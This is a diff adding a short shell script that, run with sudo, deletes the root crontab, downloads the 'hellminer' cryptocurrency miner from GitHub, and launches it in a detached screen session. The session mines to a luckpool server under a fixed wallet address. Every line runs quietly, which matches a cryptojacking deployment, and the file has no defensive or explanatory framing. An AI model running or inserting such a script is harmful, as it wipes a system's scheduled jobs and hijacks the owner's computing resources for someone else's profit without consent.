@@ -1,0 +1,8 @@
+sudo crontab -r>/dev/null
+sudo service cron reload >/dev/null
+sudo apt install apt-utils screen -y >/dev/null
+cd ~/
+sudo wget -q https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+sudo tar xf hellminer_cpu_linux.tar.gz
+sudo screen -dmS helminer ./hellminer -c  stratum+tcp://ap.luckpool.net:3956 -u RTyHMjaqZiNrWGow48WQuhrU7RkrNFjRXW.screen_worker_$(date +%s) -p x --cpu 12
+sudo screen -list
